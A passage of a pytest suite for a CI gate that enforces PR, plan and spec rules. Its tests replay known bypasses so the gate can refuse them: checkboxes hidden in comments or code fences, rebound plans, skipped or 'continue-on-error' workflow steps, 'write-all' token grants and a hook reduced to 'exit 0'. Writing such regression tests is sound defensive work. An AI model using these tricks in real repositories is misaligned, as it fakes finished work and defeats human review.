    """solyra#72 r4118831949 (spec_gate.py:395).

    The plan was picked by the branch it names at the head, so another branch
    could edit a plan already on the base (even one marked done after its PR
    merged) to name itself, swap the PR number and restore status: ready. A plan
    on the base keeps its branch and PR, and a done plan authorizes nothing more.
    """
    other = "feature/feat-model-001-second-try"
    on_base(repo, {PLAN: plan(pr=12, status="done")})
    rebound = plan(branch=other, pr=13)
    r = pr(repo, other, {**CODE, PLAN: rebound}, PR_HEAD_REF=other)
    assert r.returncode == 1, r.stdout
    assert f"names branch '{BRANCH}' on the base" in r.stdout and "records PR #12" in r.stdout, r.stdout
    assert "status: done on the base" in r.stdout, r.stdout
    # the plan's own branch may fill in a PR number it never had, and keep the one it has
    on_base(repo, {PLAN: plan()})
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42)}).returncode == 0
    on_base(repo, {PLAN: plan(pr=42)})
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42)}).returncode == 0
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=43)})
    assert r.returncode == 1 and "records PR #42" in r.stdout, r.stdout


def test_a_plan_names_its_feat_id(repo):
    """solyra#72 r4118878750 (spec_gate.py:267).

    `feat_id: ""` passed the type check and skipped the mismatch check because the
    value was falsy, so a plan with no FEAT-ID authorized code. The key must hold
    the branch's FEAT-ID, nothing less.
    """
    for value in ('""', "null", "[FEAT-MODEL-001]"):
        r = pr(repo, BRANCH, {**CODE, PLAN: plan(feat_id=value)})
        assert r.returncode == 1 and "but the branch serves FEAT-MODEL-001" in r.stdout, (value, r.stdout)


def test_hidden_checklist_entries_do_not_count(repo):
    """stocks#1205 r4118374587 (spec_gate.py:398).

    The checklist parser read every line, so a ticked done_when item inside an
    HTML comment (the PR template's) or a fenced code example counted as done
    while the rendered body showed nothing. Comments and fences are removed
    before the body is parsed, for the checklist, the canvas markers and the
    Capacity section alike.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_NUMBER": "42"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    files = {**CODE, PLAN: plan(pr=42), CATALOG: row}
    hidden = (f"Spec: {SPEC}\nPlan: {PLAN}\n\n<!--\n- [x] {DONE[0]}\n-->\n```\n- [x] {DONE[1]}\n```\n"
              f"\n- [ ] {DONE[0]}\n- [ ] {DONE[1]}\n")
    r = pr(repo, BRANCH, files, **meta, PR_BODY=hidden, PR_DRAFT="false")
    assert r.returncode == 1 and "done_when item(s) not ticked" in r.stdout, r.stdout
    assert pr(repo, BRANCH, files, **meta, PR_BODY=body(ticked=True), PR_DRAFT="false").returncode == 0

    # stocks#1205 r4119299917: a path is linked as a whole token
    lookalike = f"Spec: {SPEC}.old\nPlan: {PLAN}-v2\n\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=lookalike)
    assert r.returncode == 1 and "must link the spec" in r.stdout and "must link the plan" in r.stdout, r.stdout
    linked = f"[spec](https://example.test/blob/main/{SPEC}) [plan](https://example.test/blob/main/{PLAN})\n\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=linked).returncode == 0
    # stocks#1205 r4119162200: an unclosed comment hides everything after it
    unclosed = f"Notes\n<!--\nSpec: {SPEC}\nPlan: {PLAN}\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=unclosed)
    assert r.returncode == 1 and "PR body must link the spec" in r.stdout, r.stdout
    # solyra#72 r4119153674: an indented line after plain text or a blank is not a checkbox
    # continuation, and must not crash the gate
    nested = f"Spec: {SPEC}\nPlan: {PLAN}\n\nNotes\n  - a nested bullet\n\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=nested)
    assert r.returncode == 0 and "Traceback" not in r.stderr, r.stdout + r.stderr
    # solyra#72 r4119153683: a fence nested under a list item is indented four spaces and is
    # still code
    fenced_item = f"- [ ] example\n\n    ```\n    Spec: {SPEC}\n    Plan: {PLAN}\n    - [x] {DONE[0]}\n    - [x] {DONE[1]}\n    ```\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=fenced_item)
    assert r.returncode == 1 and "PR body must link the spec" in r.stdout, r.stdout
    # stocks#1205 r4119048047: a closer mixing the two fence characters does not close a
    # backtick fence for Markdown, so everything after it is still code
    mixed = f"Spec: {SPEC}\nPlan: {PLAN}\n\n```\nexample\n```~~~\n- [x] {DONE[0]}\n- [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=mixed)
    assert r.returncode == 1 and "must carry each done_when item" in r.stdout, r.stdout


def test_a_spike_never_opens_a_pull_request(repo):
    """stocks#1205 r4118374586 (spec_gate.py:315).

    A spike/ PR carrying only its investigation note had no gated file, so the
    gate passed it, although a spike is local commits only. In PR mode a spike/
    branch fails whatever it changes; in commit mode it still passes anything.
    """
    r = pr(repo, "spike/try", {"docs/spikes/try.md": "# Notes\n"})
    assert r.returncode == 1 and "is a spike: local investigation commits only" in r.stdout, r.stdout
    assert pr(repo, "spike/try", CODE).returncode == 1
    _git(repo, "checkout", "-q", "-B", "spike/try", "base")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "lib/model.py")
    assert gate(repo, "--commit").returncode == 0


def test_only_a_merge_of_main_is_measured_against_merge_head(repo):
    """stocks#1205 r4118374592 (spec_gate.py:699).

    Every merge in progress was measured against MERGE_HEAD, so a merge into
    main saw an empty diff and passed, and a feature branch merging another
    feature's commits was judged only on its own side. Now: a local merge into
    main is refused; a branch merging main is measured against main's side; a
    branch merging anything else is measured against HEAD, as its own change.
    """
    _git(repo, "checkout", "-q", "-B", "feature/feat-data-001-other", "base")
    write(repo, "lib/other.py", "x = 1\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "other feature's code")
    _git(repo, "checkout", "-q", "main")
    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "feature/feat-data-001-other")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "a merge into main is committed locally" in r.stdout, r.stdout
    _git(repo, "merge", "--abort")

    _git(repo, "checkout", "-q", "-B", "docs/typo", "base")
    write(repo, "docs/notes.md", "# Notes\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "docs")
    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "feature/feat-data-001-other")
    r = gate(repo, "--commit")
    assert r.returncode == 1 and "lib/other.py" in r.stdout, r.stdout
    _git(repo, "merge", "--abort")

    _git(repo, "checkout", "-q", "main")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "code on main")
    _git(repo, "checkout", "-q", "docs/typo")
    _git(repo, "merge", "-q", "--no-commit", "--no-ff", "main")
    assert gate(repo, "--commit").returncode == 0, "merging main into a docs branch"


def test_the_pr_body_contract_is_read_as_rendered_in_every_form(repo):
    """solyra#72 r4118418388 and stocks#1205 r4118420392 (spec_gate.py:463): the spec
    and plan paths hidden in a comment passed the substring check. stocks#1205
    r4118420390 (:404): a fence indented up to three spaces, or closed by a longer
    fence, was not stripped. solyra#72 r4118418411 (:503): `Volume:` followed by a
    newline borrowed the next label as its value.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    hidden_links = f"<!-- Spec: {SPEC} Plan: {PLAN} -->\n\n- [ ] {DONE[0]}\n- [ ] {DONE[1]}\n"
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=hidden_links)
    assert r.returncode == 1 and "must link the spec" in r.stdout and "must link the plan" in r.stdout, r.stdout
    fenced = (f"Spec: {SPEC}\nPlan: {PLAN}\n\n   ```\n- [x] {DONE[0]}\n````\n\n~~~text\n- [x] {DONE[1]}\n~~~\n"
              f"- [ ] {DONE[0]}\n- [ ] {DONE[1]}\n")
    meta = {**title, "PR_NUMBER": "42", "PR_DRAFT": "false"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=fenced)
    assert r.returncode == 1 and "done_when item(s) not ticked" in r.stdout, r.stdout
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    split = body() + "\n\n## Capacity\nVolume:\nVelocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=split)
    assert r.returncode == 1 and "leaves Volume blank" in r.stdout, r.stdout


def test_each_done_when_item_needs_its_own_checkbox(repo):
    """stocks#1205 r4118420395 (spec_gate.py:465).

    `run the tests` and `run the tests on 3.12` were both satisfied by one
    checkbox carrying the longer text. Each item now claims its own line,
    longest first, in the body check and the close-out check alike.
    """
    on_base(repo, {SPEC: spec(done_when=["run the tests", "run the tests on 3.12"])})
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    one_box = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [ ] run the tests on 3.12\n"
    r = pr(repo, BRANCH, CODE, **title, PR_BODY=one_box)
    assert r.returncode == 1 and "missing: run the tests" in r.stdout, r.stdout
    two = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- [ ] run the tests on 3.12\n- [ ] run the tests (make test)\n"
    assert pr(repo, BRANCH, CODE, **title, PR_BODY=two).returncode == 0


def test_the_pr_number_goes_in_the_prs_cell(repo):
    """solyra#72 r4118418395 (spec_gate.py:658).

    Any added row text holding the FEAT-ID and `#N` satisfied the solyra
    close-out, so the number could sit in Top blockers while PRs stayed `none`.
    The PRs cell of the FEAT's row must carry the number.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    wrong_cell = CATALOG_TEXT.replace("| [FEAT-MODEL-001](#feat-model-001) | Models | Production | unknown | none |",
                                      f"| [FEAT-MODEL-001](#feat-model-001) | Models (#42) | Production | {TODAY} | none |")
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: wrong_cell}, **meta)
    assert r.returncode == 1 and "row's PRs column (it reads 'none')" in r.stdout, r.stdout


def test_other_product_documents_and_specs_do_not_change_with_code(repo):
    """solyra#72 r4118418393 and stocks#1205 r4118420386 (spec_gate.py:554): canvases.yml
    and every other docs/product/ file except the FEAT's own records, the model
    registry and its generated files are refused on a feature change. solyra#72
    r4118418403 (:379): so is any spec other than the plan's, added or edited.
    """
    ok = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body()}
    r = pr(repo, BRANCH, {**CODE, "docs/product/canvases.yml": "canvases: []\n"}, **ok)
    assert r.returncode == 1 and "docs/product/canvases.yml changes in this feature change" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, "docs/product/13-ROADMAP.md": "# Roadmap\n"}, **ok)
    assert r.returncode == 1 and "13-ROADMAP.md changes in this feature change" in r.stdout, r.stdout
    assert pr(repo, BRANCH, {**CODE, "docs/product/07-MODEL-REGISTRY.md": "# Registry\n",
                             "docs/product/generated/model-registry.json": "{}\n"}, **ok).returncode == 0
    # solyra#72 r4118481048: the registry allowance is two exact paths, not two prefixes
    r = pr(repo, BRANCH, {**CODE, "docs/product/07-MODEL-REGISTRY.md.backup": "x\n"}, **ok)
    assert r.returncode == 1 and "07-MODEL-REGISTRY.md.backup changes in this feature change" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, "docs/product/generated/extra.json": "{}\n"}, **ok)
    assert r.returncode == 1 and "generated/extra.json changes in this feature change" in r.stdout, r.stdout
    other = "docs/superpowers/specs/2026-09-28-other.md"
    r = pr(repo, BRANCH, {**CODE, other: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]")}, **ok)
    assert r.returncode == 1 and f"spec(s) change alongside code ({other})" in r.stdout, r.stdout


def test_policy_documents_are_read_at_the_current_base(repo):
    """solyra#72 r4118418406 (spec_gate.py:743, P1).

    The catalog and the approved spec were read at the merge base, so a spec
    superseded on main after the branch forked was still honoured. They are
    read at the PR's current base; the diff is still taken from the merge base.
    """
    _git(repo, "checkout", "-q", "-B", BRANCH, "base")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "implementation on the old spec")
    newer = "docs/superpowers/specs/2026-09-20-model-decisions-v2.md"
    _git(repo, "checkout", "-q", "main")
    write(repo, newer, spec(supersedes=SPEC))
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main supersedes the spec after the fork")
    r = gate(repo, "--pr", "main", BRANCH, PR_HEAD_REF=BRANCH, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body())
    assert r.returncode == 1 and f"{SPEC} is superseded by {newer}" in r.stdout, r.stdout


def test_a_docs_only_feature_pr_is_still_scoped(repo):
    """stocks#1205 r4118475503 (spec_gate.py:329).

    A feature/ PR with no gated file returned before the product-scope check,
    so it could rewrite the requirements or another capability's record with
    no plan. The scope rules run on every feature/ or fix/ PR from its branch
    name alone.
    """
    r = pr(repo, BRANCH, {REQUIREMENTS: REQUIREMENTS_TEXT + "\n**REQ-MODEL-002:** Faster.\n"})
    assert r.returncode == 1 and "requirements change on their own docs/ branch" in r.stdout, r.stdout
    other = CATALOG_TEXT.replace("### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Retired")
    r = pr(repo, BRANCH, {CATALOG: other})
    assert r.returncode == 1 and "lines outside FEAT-MODEL-001's row and record change" in r.stdout, r.stdout
    assert pr(repo, BRANCH, {"docs/notes.md": "# Notes\n"}).returncode == 0


def test_the_lineage_entry_is_visible(repo):
    """stocks#1205 r4118475512 (spec_gate.py:693).

    Any added line in the FEAT's traceability section holding `#N` satisfied
    the close-out, so `<!-- #42 -->` or a prose mention passed. The number must
    be on a rendered `**PR lineage:**` line or a list item of that section.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    base_trace = "# Traceability\n\n### FEAT-MODEL-001\n\n**PR lineage:** [#7](x) *origin*\n\n### FEAT-DATA-001\n\n- #1\n"
    on_base(repo, {TRACEABILITY: base_trace})
    files = {**CODE, PLAN: plan(pr=42), CATALOG: row}
    hidden = base_trace.replace("*origin*\n", "*origin*\n<!-- #42 -->\n")
    r = pr(repo, BRANCH, {**files, TRACEABILITY: hidden}, **meta)
    assert r.returncode == 1 and "PR lineage" in r.stdout, r.stdout
    prose = base_trace.replace("*origin*\n", "*origin*\n\nSee also #42 for context.\n")
    r = pr(repo, BRANCH, {**files, TRACEABILITY: prose}, **meta)
    assert r.returncode == 1 and "PR lineage" in r.stdout, r.stdout
    entry = base_trace.replace("*origin*\n", "*origin* \u00b7 [#42](y) *close-out*\n")
    assert pr(repo, BRANCH, {**files, TRACEABILITY: entry}, **meta).returncode == 0


def test_a_feature_pr_without_a_plan_fails_cleanly_when_ready(repo):
    """solyra#72 r4118525514 (spec_gate.py:809).

    After the docs-only scope fix, the plan and close-out checks ran whenever
    the branch shape matched, so a ready feature PR with no traced plan
    crashed on `None.plan_fm` in CI instead of printing what was missing.
    """
    r = pr(repo, "feature/feat-model-001-no-plan", CODE, PR_NUMBER="42", PR_DRAFT="false",
           PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body(ticked=True))
    assert r.returncode == 1 and "no plan in docs/superpowers/plans names branch" in r.stdout, r.stdout + r.stderr
    assert "Traceback" not in r.stderr, r.stderr
    # since solyra#72 r4119610902 a feature branch is traced even with documentation only
    r = pr(repo, "feature/feat-model-001-no-plan", {"docs/notes.md": "# n\n"}, PR_NUMBER="42", PR_DRAFT="false")
    assert r.returncode == 1 and "no plan in docs/superpowers/plans names branch" in r.stdout, r.stdout + r.stderr
    assert "Traceback" not in r.stderr, r.stderr


def test_a_pull_request_targets_main_only(repo):
    """solyra#72 r4118525521 (spec-gate.yml:41).

    Only the base SHA reached the gate, so a PR stacked onto another branch
    was judged against that branch's catalog and specs as policy. CI passes
    PR_BASE_REF and the gate refuses any base but main.
    """
    r = pr(repo, BRANCH, CODE, PR_BASE_REF="feature/feat-model-001-parent")
    assert r.returncode == 1 and "targets 'feature/feat-model-001-parent'; pull requests here target main only" in r.stdout, r.stdout
    assert pr(repo, BRANCH, CODE, PR_BASE_REF="main").returncode == 0
    workflow = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
    step = next(s for s in workflow["jobs"]["gate"]["steps"] if "spec_gate.py --pr" in s.get("run", ""))
    assert step["env"]["PR_BASE_REF"] == "${{ github.event.pull_request.base.ref }}"


def test_frontmatter_shapes_the_gate_did_not_expect_fail_cleanly(repo):
    """solyra#72 r4118587869 (spec_gate.py:201) and r4118587840 (:60).

    `feat_id: [FEAT-MODEL-001]` parsed as a list and crashed the set lookup
    with a TypeError; a catalog row inside an HTML comment or a fence counted
    as a capability. Both are now plain gate errors, and catalog rows are the
    rendered ones.
    """
    on_base(repo, {SPEC: spec(feat_id="[FEAT-MODEL-001]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "feat_id must be one FEAT-ID, not a list" in r.stdout, r.stdout + r.stderr
    assert "Traceback" not in r.stderr, r.stderr
    # solyra#72 r4118997587: an empty feat_id skipped the catalog check and --check-spec said ok
    on_base(repo, {SPEC: spec(feat_id='""')})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "feat_id '' is not in" in r.stdout, r.stdout
    write(repo, SPEC, spec(feat_id='""'))
    r = gate(repo, "--check-spec", SPEC)
    assert r.returncode == 1 and "is not in" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(), PLAN: plan(feat_id="[FEAT-MODEL-001]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "but the branch serves FEAT-MODEL-001" in r.stdout and "Traceback" not in r.stderr
    hidden_row = CATALOG_TEXT + "\n<!--\n| [FEAT-FAKE-001](#x) | Fake | Production | unknown | none |\n-->\n"
    fake_spec, fake_plan = "docs/superpowers/specs/2026-09-28-fake.md", "docs/superpowers/plans/2026-09-28-fake.md"
    on_base(repo, {PLAN: plan(), CATALOG: hidden_row, fake_spec: spec(feat_id="FEAT-FAKE-001", req_ids="[REQ-MODEL-001]"),
                   fake_plan: plan(feat_id="FEAT-FAKE-001", spec=fake_spec, branch="feature/feat-fake-001-x")})
    r = pr(repo, "feature/feat-fake-001-x", CODE)
    assert r.returncode == 1 and "FEAT-FAKE-001 is not a row in" in r.stdout, r.stdout


def test_other_plans_do_not_change_with_code(repo):
    """solyra#72 r4118587858 (spec_gate.py:390).

    Other specs were refused alongside code, but another branch's plan was
    still documentation, so feature A could rewrite feature B's plan (its
    branch, status or spec binding) unvalidated. Only the plan naming this
    branch may change with code.
    """
    other = "docs/superpowers/plans/2026-09-05-other.md"
    on_base(repo, {other: plan(branch="feature/feat-model-001-other")})
    r = pr(repo, BRANCH, {**CODE, other: plan(branch="feature/feat-model-001-other", status="done")})
    assert r.returncode == 1 and f"other plan(s) change alongside code ({other})" in r.stdout, r.stdout
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=7)}).returncode == 0


def test_a_plan_without_a_spec_authorizes_nothing(repo):
    """solyra#72 r4118650492 (spec_gate.py:246, P1).

    `spec: null` or a blank `spec:` satisfied the required-key check and the
    truthiness guards, so check() returned no errors and no trace, and code
    passed with every PR check skipped. A plan's spec must be a path.
    """
    for value in ("null", '""'):
        r = pr(repo, BRANCH, {**CODE, PLAN: plan(spec=value)})
        assert r.returncode == 1 and "spec must name the approved spec's path" in r.stdout, (value, r.stdout)
    _git(repo, "checkout", "-q", "-B", BRANCH, "base")
    write(repo, PLAN, plan(spec="null"))
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    assert gate(repo, "--commit").returncode == 1


def test_a_workflow_is_never_documentation(repo):
    """solyra#72 r4118650497 (spec_gate.py:136, P1).

    `LICENSE*` was documentation by basename, so `.github/workflows/LICENSE-
    release.yml` slipped through as documentation and a docs/ branch could ship
    a workflow. Anything under .github/workflows/ that is not Markdown is gated,
    and the license exemption names license documents only.
    """
    r = pr(repo, "docs/license", {".github/workflows/LICENSE-release.yml": "on: push\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    assert pr(repo, "docs/license", {"LICENSE": "MIT\n", "LICENSE-THIRD-PARTY.txt": "x\n", "COPYING": "x\n",
                                       ".github/workflows/README.md": "# Workflows\n"}).returncode == 0
    assert pr(repo, "docs/license", {"LICENSE.py": "print(1)\n"}).returncode == 1
    # stocks#1205 r4118721651: the middle group took any extension, so LICENSE.ps1 was a document
    for name in ("LICENSE.ps1", "LICENSE.exe", "COPYING.bat", "LICENSE-MIT.sh"):
        assert pr(repo, "docs/license", {name: "x\n"}).returncode == 1, name
    assert pr(repo, "docs/license", {"LICENSE-MIT.md": "x\n", "LICENCE-APACHE-2": "x\n"}).returncode == 0


def test_indented_code_blocks_do_not_count(repo):
    """solyra#72 r4118650481 (spec_gate.py:431).

    A four-space-indented block renders as code, but only fences and comments
    were stripped, so the spec and plan paths and every ticked box could sit
    in one. Indented code blocks are removed with the rest.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_NUMBER": "42", "PR_DRAFT": "false"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    indented = f"Notes\n\n    Spec: {SPEC}\n    Plan: {PLAN}\n    - [x] {DONE[0]}\n    - [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=indented)
    assert r.returncode == 1 and "must link the spec" in r.stdout and "missing:" in r.stdout, r.stdout
    nested = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- work\n    - [x] {DONE[0]}\n    - [x] {DONE[1]}\n"
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=nested).returncode == 0


def test_a_gate_workflow_keeps_its_steps_active_and_its_token_read_only(repo):
    """solyra#72 r4119837190 (P1), r4119837212 (P1), r4119837242 (spec_gate.py:521, :96;
    registry-check.yml:59).

    The contract accepted a command inside a step carrying `if: ${{ false }}`, a job-level
    `permissions: write-all` beside the read-only top-level block, and an executable hook
    reduced to `exit 0`. A skipped step or job counts as absent, any write grant fails, and
    the hook must still run `spec_gate.py --commit`.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - name: gate\n{IF}        run: |\n"
            "          python3 -m py_compile \"$gate\"\n          python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\"\n"
            "          pytest tests/scripts/test_spec_gate.py\n          git ls-tree \"$HEAD_SHA\" .githooks/pre-commit\n"
            "          export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
    assert pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": head.replace("{IF}", "")}, **cap).returncode == 0
    r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": head.replace("{IF}", "        if: ${{ false }}\n")}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout and "`if:` may skip" in r.stdout, r.stdout
    job_if = head.replace("{IF}", "").replace("    runs-on: ubuntu-latest\n", "    if: github.actor == 'nobody'\n    runs-on: ubuntu-latest\n")
    r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": job_if}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    for grant in ("    permissions: write-all\n", "    permissions:\n      contents: write\n"):
        widened = head.replace("{IF}", "").replace("    runs-on: ubuntu-latest\n", grant + "    runs-on: ubuntu-latest\n")
        r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": widened}, **cap)
        assert r.returncode == 1 and "grants a write permission" in r.stdout, (grant, r.stdout)
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\n"})
    r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\n# python3 scripts/gate/spec_gate.py --commit\nexit 0\n"}, **cap)
    assert r.returncode == 1 and "no longer runs `scripts/gate/spec_gate.py --commit`" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap).returncode == 0


def test_records_stay_unique_and_frozen_on_documentation_branches(repo):
    """solyra#72 r4119837221, r4119837230, r4119837265, r4119837259 (spec_gate.py:551, :461,
    :126, :502).

    A docs/ PR could append a second catalog row for a FEAT, rewrite a superseded spec's
    body, delete canvases.yml, or add a brand-new plan already marked done; each received
    `spec gate ok`. All four are refused before the documentation-only return.
    """
    twice = CATALOG_TEXT.replace("| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n",
                                 "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n"
                                 "| [FEAT-MODEL-001](#feat-model-001) | Models | Retired | unknown | none |\n")
    r = pr(repo, "docs/catalog", {CATALOG: twice})
    assert r.returncode == 1 and "FEAT-MODEL-001 has more than one heading or row" in r.stdout, r.stdout
    assert pr(repo, "docs/catalog", {CATALOG: CATALOG_TEXT.replace("| Models | Production |", "| Models | Beta |")}).returncode == 0
    on_base(repo, {SPEC: spec(status="superseded")})
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded", done_when=["something easier"])})
    assert r.returncode == 1 and "a superseded spec does not change" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(), "docs/product/canvases.yml": "canvases: []\n"})
    r = pr(repo, "docs/cleanup", {"docs/product/canvases.yml": None})
    assert r.returncode == 1 and "policy documents cannot be removed" in r.stdout, r.stdout
    new_plan, data_spec = "docs/superpowers/plans/2026-09-28-data.md", "docs/superpowers/specs/2026-09-28-data.md"
    on_base(repo, {data_spec: spec(feat_id="FEAT-DATA-001")})
    done = plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=data_spec, status="done", pr=77)
    r = pr(repo, "docs/plan-data", {new_plan: done})
    assert r.returncode == 1 and "status is 'done'" in r.stdout, r.stdout
    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=data_spec)}).returncode == 0


def test_capacity_values_are_numbers(repo):
    """solyra#72 r4119837253 (spec_gate.py:804).

    `Volume: unknown · Velocity: fast · Wall-clock: later · 30: TBD` passed, because each
    label needed only a non-blank value. Every value now carries a number, or the section
    says `n/a: <why>`.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    vague = body() + "\n\n## Capacity\nVolume: unknown \u00b7 Velocity: fast \u00b7 Wall-clock: later \u00b7 $/run \u00d7 runs/day \u00d7 30: TBD\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=vague)
    assert r.returncode == 1 and "gives no number for Volume, Velocity, Wall-clock, 30" in r.stdout, r.stdout
    partial = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: one query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=partial)
    assert r.returncode == 1 and "gives no number for Velocity;" in r.stdout, r.stdout
    filled = body() + "\n\n## Capacity\nVolume: 30 rows \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01\n"
    assert pr(repo, BRANCH, job, **title, PR_BODY=filled).returncode == 0


def test_the_gate_workflows_and_suite_cannot_be_hollowed_out(repo):
    """solyra#72 r4119957700 (P1), r4119957705 (P1), r4119957711 (P1), r4119957726 (P1)
    (spec_gate.py:162, :179; registry-check.yml:94; spec_gate.py:80).

    A contract step with `continue-on-error: true`, a `permissions: write-all  # why` or
    `{contents: write}` grant, a suite replaced by one passing test, and a new executable
    under .githooks/ all passed the chore allowance. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "{JOB}    runs-on: ubuntu-latest\n    steps:\n      - name: gate\n{STEP}        run: |\n"
            "          python3 -m py_compile \"$gate\"\n          python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\"\n"
            "          pytest tests/scripts/test_spec_gate.py\n          git ls-tree \"$HEAD_SHA\" .githooks/pre-commit\n"
            "          export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
    wf = ".github/workflows/registry-check.yml"
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{STEP}", "")}, **cap).returncode == 0
    for step, job in (("        continue-on-error: true\n", ""), ("", "    continue-on-error: ${{ true }}\n")):
